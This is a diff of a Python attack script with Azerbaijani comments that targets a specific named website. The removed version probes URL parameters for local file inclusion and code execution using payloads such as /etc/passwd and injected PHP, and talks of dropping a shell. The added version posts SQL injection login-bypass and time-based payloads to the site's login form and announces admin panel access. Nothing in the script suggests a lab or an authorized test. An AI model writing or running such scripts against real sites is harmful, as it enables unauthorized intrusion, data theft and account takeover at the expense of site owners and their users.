@@ -1,44 +1,58 @@
 import asyncio
 import httpx
+import time
 
-TARGET = "https://empro.az"
+TARGET_URL = "https://empro.az/login" # Login qapısı
 
-# Serverdə kod işlətməyə imkan verən kritik parametrlər
-VULN_PARAMS = [
-    "file", "page", "dir", "path", "cmd", "exec", "include", "source"
+# SQL mühərrikini aldatmaq üçün universal 'bypass' kodları
+SQL_PAYLOADS = [
+    "' OR 1=1 --",
+    "admin' --",
+    "admin' #",
+    "' or '1'='1",
+    "admin' AND (SELECT 1 FROM (SELECT(SLEEP(5)))a)--" 
 ]
 
-# Sınaq üçün bəsit test komandaları
-PAYLOADS = [
-    "/etc/passwd", "C:/Windows/win.ini", "<?php echo 'HACKED'; ?>", "index.php"
-]
-
-async def check_vulnerability(param, payload, client):
-    # Saytın daxili strukturu: empro.az?file=payload
-    url = f"{TARGET}/?{param}={payload}"
+async def inject(payload, client):
+    # Saytın daxili form adlarını (email/password) təxmin edirik
+    data = {
+        "email": payload, 
+        "password": "wrong_password",
+        "submit": "1"
+    }
+    
     try:
-        headers = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"}
-        response = await client.get(url, headers=headers, timeout=10)
+        start_time = time.time()
+        response = await client.post(TARGET_URL, data=data, timeout=20)
+        end_time = time.time()
         
-        # Əgər server bizə 'root' istifadəçisini və ya 'index.php' kodunu göstərsə
-        if "root:" in response.text or "Index of" in response.text or "HACKED" in response.text:
-            print(f"🔥 [CRITICAL] ZƏİFLİK TAPILDI: {url}")
-            print(f"🚩 Bu nöqtədən sayta SHELL ata bilərik!")
+        # 1. Metod: Time-based (Əgər server 5 saniyədən gec cavab verirsə, bu SQLi-dir)
+        if (end_time - start_time) >= 5:
+             print(f"🔥 [CRITICAL] SQLi TAPILDI (Time-Based): {payload}")
+             print("🚩 Serverin beyni donduruldu, məlumatları çəkə bilərik!")
+             return True
+             
+        # 2. Metod: Error-based / Boolean
+        # Əgər 'şifrə səhvdir' yazısı yox olursa, deməli içəridəyik
+        if response.status_code == 302 or "dashboard" in response.text.lower():
+            print(f"✅ [SUCCESS] AUTH BYPASS UĞURLU: {payload}")
+            print(f"🔗 Daxil olmaq üçün bu kodu istifadəçi adı yerinə yazın!")
             return True
-    except:
+            
+    except Exception:
         pass
     return False
 
 async def main():
-    print(f"🔍 [SCAN] RCE və LFI BOŞLUQLARI YOXLANILIR: {TARGET}")
+    print(f"🕵️  ADVANCED LOGIN BYPASS BAŞLADI: {TARGET_URL}")
+    print("[*] SQL Injection vektorları yoxlanılır...\n")
+    
     async with httpx.AsyncClient(verify=False) as client:
-        tasks = []
-        for p in VULN_PARAMS:
-            for l in PAYLOADS:
-                tasks.append(check_vulnerability(p, l, client))
-        
-        await asyncio.gather(*tasks)
-    print("\n[!] Skan bitdi. Əgər nəticə yoxdursa, saytın daxili qeydiyyat formasından (Register) SQL-injection sınağı etməliyik.")
+        for p in SQL_PAYLOADS:
+            if await inject(p, client):
+                print("\n[!] SIZMA TAMAMLANDI! Admin panelinə giriş açıldı.")
+                break
+            await asyncio.sleep(1)
 
 if __name__ == "__main__":
     asyncio.run(main())
